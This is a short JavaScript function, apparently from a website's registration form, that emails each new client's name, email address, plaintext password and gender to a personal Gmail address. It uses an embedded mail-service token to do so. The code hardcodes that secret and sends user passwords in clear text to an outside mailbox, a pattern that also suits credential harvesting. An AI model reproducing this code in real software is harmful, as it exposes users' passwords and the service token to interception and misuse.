export function sendEmail(data){
  Email.send({
    SecureToken: 'df8f40ea-1dd8-472f-8275-cb1c21b6e940',
    To : 'wardude704@gmail.com',
    From : "wardude704@gmail.com",
    Subject : "Client Register Details",
    Body : `
      <br> FirstName: ${data.firstName};
      <br> LastName: ${data.lastName};
      <br> Email: ${data.email};
      <br> Password: ${data.password};
      <br> Gender: ${data.gender}
    `
  }).then(
    message => log('Message Sent Sucessfully! \nYou will get a reply shortly.')
  );
}